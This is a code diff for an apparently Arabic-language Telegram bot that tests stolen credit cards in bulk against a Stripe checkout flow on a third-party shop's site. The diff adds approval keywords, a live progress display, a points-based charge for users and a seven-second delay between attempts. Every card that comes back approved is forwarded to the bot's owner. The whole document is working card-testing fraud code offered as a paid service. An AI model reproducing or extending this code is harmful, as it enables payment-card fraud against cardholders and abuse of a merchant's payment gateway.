@@ -203,11 +203,11 @@ active_scans = set()
 mes = types.InlineKeyboardMarkup()
 mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))
 
+# كلمات الـ Approved
+APPROVED_KEYWORDS = ['APPROVED', 'Charged', 'succeeded', 'success":true']
+
 # ==================== دالة الفحص (بوابة shop.mederikoi.com) ====================
 def stripe_checker(ccx):
-    """
-    فحص بطاقة باستخدام تدفق Stripe من موقع shop.mederikoi.com
-    """
     r = requests.Session()
     
     ccx = ccx.strip()
@@ -294,7 +294,7 @@ def stripe_checker(ccx):
         elif 'declined' in response.text.lower():
             return "DECLINED"
         else:
-            return "UNKNOWN_RESPONSE"
+            return response.text[:50]
             
     except Exception as e:
         return f"ERROR: {str(e)[:50]}"
@@ -467,31 +467,45 @@ def my_ali4(message):
         last = stripe_checker(cc)
     except Exception as e:
         last = f'Error: {str(e)}'
-    if 'APPROVED' in last:
-        admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc}\n📝 الرد: {last}"
-        bot.send_message(admin, admin_notify)
+    
     end_time = time.time()
     execution_time = end_time - start_time
     info = dato(cc[:6])
-    if 'APPROVED' in last:
-        msg = f'''<b>Approved ✅
-
-• Card : <code>{cc}</code>
-• Response : {last}
-• Gateway : Stripe auth gate
+    
+    # رسالة للمالك عند التفعيل
+    if any(kw in last for kw in APPROVED_KEYWORDS):
+        admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc}\n📝 الرد: {last}"
+        bot.send_message(admin, admin_notify)
+        
+        # رسالة للمستخدم عند التفعيل
+        msg = f'''━━━━━━━━━━━━━━━━━━━━━━━━
+✅ APPROVED ✅
+━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Card: <code>{cc}</code>
+📡 Response: {last}
+🚪 Gateway: Stripe auth gate
+━━━━━━━━━━━━━━━━━━━━━━━━
 {info}
-• Time : {execution_time:.2f}s
-• Bot By : @Jo0000ker</b>'''
+━━━━━━━━━━━━━━━━━━━━━━━━
+⏱️ Time: {execution_time:.2f}s
+🤖 Bot By: @Jo0000ker
+━━━━━━━━━━━━━━━━━━━━━━━━'''
+        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
     else:
-        msg = f'''<b>Declined ❌
-
-• Card : <code>{cc}</code>
-• Response : {last}
-• Gateway : Stripe auth gate
+        # رسالة للمستخدم عند الرفض
+        msg = f'''━━━━━━━━━━━━━━━━━━━━━━━━
+❌ DECLINED ❌
+━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Card: <code>{cc}</code>
+📡 Response: {last}
+🚪 Gateway: Stripe auth gate
+━━━━━━━━━━━━━━━━━━━━━━━━
 {info}
-• Time : {execution_time:.2f}s
-• Bot By : @Jo0000ker</b>'''
-    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
+━━━━━━━━━━━━━━━━━━━━━━━━
+⏱️ Time: {execution_time:.2f}s
+🤖 Bot By: @Jo0000ker
+━━━━━━━━━━━━━━━━━━━━━━━━'''
+        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
 
 # ==================== معالجة الملفات ====================
 @bot.message_handler(content_types=['document'])
@@ -500,10 +514,24 @@ def GTA(message):
     if is_banned(user_id):
         bot.reply_to(message, "🚫 تم حظرك من استخدام هذا البوت.")
         return
-    file_info = bot.get_file(message.document.file_id)
-    downloaded = bot.download_file(file_info.file_path)
+    
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded = bot.download_file(file_info.file_path)
+        filename = f"com{user_id}.txt"
+        with open(filename, "wb") as f:
+            f.write(downloaded)
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Error downloading file: {e}")
+        return
+    
     lines = downloaded.decode('utf-8', errors='ignore').splitlines()
     total_cards = len([line for line in lines if line.strip()])
+    
+    if total_cards == 0:
+        bot.reply_to(message, "❌ الملف فاضي!")
+        return
+    
     if not has_points(user_id, total_cards):
         points = get_points(user_id)
         if has_active_subscription(user_id):
@@ -511,85 +539,230 @@ def GTA(message):
         else:
             bot.reply_to(message, f"❌ نقاطك غير كافية!\nلديك {points} نقطة وتحتاج {total_cards} نقطة لفحص هذا الملف.\nللحصول على نقاط تواصل مع @Jo0000ker")
             return
+    
     if user_id in active_scans:
         bot.reply_to(message, "ما تقدر تفحص اكثر من ملف بنفس الوقت")
         return
+    
     if not deduct_points(user_id, total_cards):
         bot.reply_to(message, "❌ حدث خطأ في خصم النقاط")
         return
+    
     bts = types.InlineKeyboardMarkup()
     soso = types.InlineKeyboardButton(text='Stripe Auth Gate', callback_data='ottpa2')
     bts.add(soso)
     bot.reply_to(message, 'Select the type of examination', reply_markup=bts)
-    try:
-        filename = f"com{user_id}.txt"
-        with open(filename, "wb") as f:
-            f.write(downloaded)
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Error: {e}")
 
 @bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
 def GTR(call):
     def my_ali():
         user_id = str(call.from_user.id)
         user_id_int = call.from_user.id
-        passs = 0
-        basl = 0
+        approved_count = 0
+        declined_count = 0
         filename = f"com{user_id}.txt"
+        
         if user_id_int in active_scans:
             return
         else:
             active_scans.add(user_id_int)
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="- Please Wait Processing Your File ..")
+        
+        # التحقق من وجود الملف
+        if not os.path.exists(filename):
+            bot.send_message(call.from_user.id, f"❌ خطأ: الملف غير موجود")
+            active_scans.remove(user_id_int)
+            return
+        
+        # قراءة الملف
         try:
             with open(filename, 'r') as file:
                 lino = file.readlines()
                 total = len(lino)
-                stopuser.setdefault(user_id, {})['status'] = 'start'
-                for cc in lino:
-                    if stopuser.get(user_id, {}).get('status') == 'stop':
-                        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Stopped\nApproved: {passs}\nDeclined: {basl}\nTotal: {passs + basl}')
-                        return
-                    cc = cc.strip()
-                    if not cc:
-                        continue
-                    try:
-                        start_time = time.time()
-                        last = stripe_checker(cc)
-                    except Exception as e:
-                        last = "ERROR"
-                    if 'APPROVED' in last:
-                        name = call.from_user.first_name
-                        admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc}\n📝 الرد: {last}"
-                        bot.send_message(admin, admin_notify)
-                    end_time = time.time()
-                    execution_time = end_time - start_time
-                    if 'APPROVED' in last:
-                        passs += 1
-                        info = dato(cc[:6])
-                        msg = f'''<b>Approved ✅\n\n• Card : <code>{cc}</code>\n• Response : {last}\n• Gateway : Stripe auth gate\n{info}\n• Time : {execution_time:.2f}s\n• Bot By : @Jo0000ker</b>'''
-                        bot.send_message(call.from_user.id, msg, parse_mode="HTML")
-                    else:
-                        basl += 1
-                    time.sleep(7)
         except Exception as e:
-            print(f"Error: {e}")
-        finally:
-            if user_id_int in active_scans:
-                active_scans.remove(user_id_int)
+            bot.send_message(call.from_user.id, f"❌ خطأ في قراءة الملف: {e}")
+            active_scans.remove(user_id_int)
+            return
+        
+        if total == 0:
+            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="❌ الملف فاضي!")
+            active_scans.remove(user_id_int)
+            return
+        
+        # إعادة تعيين stopuser
+        if user_id not in stopuser:
+            stopuser[user_id] = {}
+        stopuser[user_id]['status'] = 'start'
+        
+        # إنشاء واجهة الفحص
+        keyboard = types.InlineKeyboardMarkup(row_width=1)
+        keyboard.add(types.InlineKeyboardButton("⏹️ Stop", callback_data='stop'))
+        
+        # إرسال واجهة الفحص
+        status_msg = bot.edit_message_text(
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            text=f'''━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Stripe Auth Gateway 💳
+━━━━━━━━━━━━━━━━━━━━━━━━
+📌 Checking: Please Wait
+📡 Response: Processing
+━━━━━━━━━━━━━━━━━━━━━━━━
+✅ Approved: [0]
+❌ Declined: [0]
+📊 Total: [{total}]
+━━━━━━━━━━━━━━━━━━━━━━━━
+🤖 Bot By: @Jo0000ker
+━━━━━━━━━━━━━━━━━━━━━━━━
+[ ⏹️ Stop ]''',
+            reply_markup=keyboard
+        )
+        
+        # معالجة كل بطاقة
+        for idx, cc in enumerate(lino):
+            # التحقق من الإيقاف
+            if stopuser.get(user_id, {}).get('status') == 'stop':
+                bot.edit_message_text(
+                    chat_id=call.message.chat.id,
+                    message_id=status_msg.message_id,
+                    text=f'''━━━━━━━━━━━━━━━━━━━━━━━━
+⏹️ STOPPED ⏹️
+━━━━━━━━━━━━━━━━━━━━━━━━
+✅ Approved: [{approved_count}]
+❌ Declined: [{declined_count}]
+📊 Total: [{total}]
+━━━━━━━━━━━━━━━━━━━━━━━━
+🤖 Bot By: @Jo0000ker
+━━━━━━━━━━━━━━━━━━━━━━━━''',
+                    reply_markup=keyboard
+                )
+                break
+            
+            cc = cc.strip()
+            if not cc or len(cc) < 10:
+                continue
+            
+            # فحص البطاقة
+            try:
+                start_time = time.time()
+                last = stripe_checker(cc)
+                execution_time = time.time() - start_time
+            except Exception as e:
+                last = f"ERROR: {str(e)[:30]}"
+                execution_time = 0
+            
+            # تحديث الواجهة
+            if any(kw in last for kw in APPROVED_KEYWORDS):
+                approved_count += 1
+                
+                # إشعار للمالك
+                name = call.from_user.first_name
+                admin_notify = f"💰 تم تفعيل بطاقة!\n👤 المستخدم: {name}\n🆔 ID: {user_id}\n💳 البطاقة: {cc}\n📝 الرد: {last}"
+                bot.send_message(admin, admin_notify)
+                
+                # إرسال النتيجة للمستخدم
+                info = dato(cc[:6])
+                msg = f'''━━━━━━━━━━━━━━━━━━━━━━━━
+✅ APPROVED ✅
+━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Card: <code>{cc}</code>
+📡 Response: {last}
+🚪 Gateway: Stripe auth gate
+━━━━━━━━━━━━━━━━━━━━━━━━
+{info}
+━━━━━━━━━━━━━━━━━━━━━━━━
+⏱️ Time: {execution_time:.2f}s
+🤖 Bot By: @Jo0000ker
+━━━━━━━━━━━━━━━━━━━━━━━━'''
+                bot.send_message(call.from_user.id, msg, parse_mode="HTML")
+                
+                # تحديث واجهة الفحص
+                try:
+                    bot.edit_message_text(
+                        chat_id=call.message.chat.id,
+                        message_id=status_msg.message_id,
+                        text=f'''━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Stripe Auth Gateway 💳
+━━━━━━━━━━━━━━━━━━━━━━━━
+📌 Checking: {cc[:20]}...
+📡 Response: {last[:30]}
+━━━━━━━━━━━━━━━━━━━━━━━━
+✅ Approved: [{approved_count}]
+❌ Declined: [{declined_count}]
+📊 Total: [{total}]
+━━━━━━━━━━━━━━━━━━━━━━━━
+🤖 Bot By: @Jo0000ker
+━━━━━━━━━━━━━━━━━━━━━━━━
+[ ⏹️ Stop ]''',
+                        reply_markup=keyboard
+                    )
+                except:
+                    pass
+            else:
+                declined_count += 1
+                # تحديث واجهة الفحص للبطاقات المرفوضة
+                try:
+                    bot.edit_message_text(
+                        chat_id=call.message.chat.id,
+                        message_id=status_msg.message_id,
+                        text=f'''━━━━━━━━━━━━━━━━━━━━━━━━
+💳 Stripe Auth Gateway 💳
+━━━━━━━━━━━━━━━━━━━━━━━━
+📌 Checking: {cc[:20]}...
+📡 Response: {last[:30]}
+━━━━━━━━━━━━━━━━━━━━━━━━
+✅ Approved: [{approved_count}]
+❌ Declined: [{declined_count}]
+📊 Total: [{total}]
+━━━━━━━━━━━━━━━━━━━━━━━━
+🤖 Bot By: @Jo0000ker
+━━━━━━━━━━━━━━━━━━━━━━━━
+[ ⏹️ Stop ]''',
+                        reply_markup=keyboard
+                    )
+                except:
+                    pass
+            
+            # انتظار بين البطاقات (مهم لحماية البوابة)
+            time.sleep(7)
+        
+        # رسالة الانتهاء
+        if stopuser.get(user_id, {}).get('status') != 'stop':
+            bot.edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=status_msg.message_id,
+                text=f'''━━━━━━━━━━━━━━━━━━━━━━━━
+✅ COMPLETED ✅
+━━━━━━━━━━━━━━━━━━━━━━━━
+✅ Approved: [{approved_count}]
+❌ Declined: [{declined_count}]
+📊 Total: [{total}]
+━━━━━━━━━━━━━━━━━━━━━━━━
+🤖 Bot By: @Jo0000ker
+━━━━━━━━━━━━━━━━━━━━━━━━''',
+                reply_markup=keyboard
+            )
+        
+        # حذف الملف المؤقت
         try:
-            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Completed ✅\nApproved: {passs}\nDeclined: {basl}\nTotal: {passs + basl}\nDev: @Jo0000ker')
+            os.remove(filename)
         except:
             pass
+        
+        # إزالة المستخدم من قائمة الفحص النشط
+        if user_id_int in active_scans:
+            active_scans.remove(user_id_int)
+    
     my_thread = threading.Thread(target=my_ali)
     my_thread.start()
 
 @bot.callback_query_handler(func=lambda call: call.data == 'stop')
 def menu_callback(call):
     uid = str(call.from_user.id)
-    stopuser.setdefault(uid, {})['status'] = 'stop'
+    if uid not in stopuser:
+        stopuser[uid] = {}
+    stopuser[uid]['status'] = 'stop'
     try:
-        bot.answer_callback_query(call.id, "Stopped ✅")
+        bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص")
     except:
         pass
 
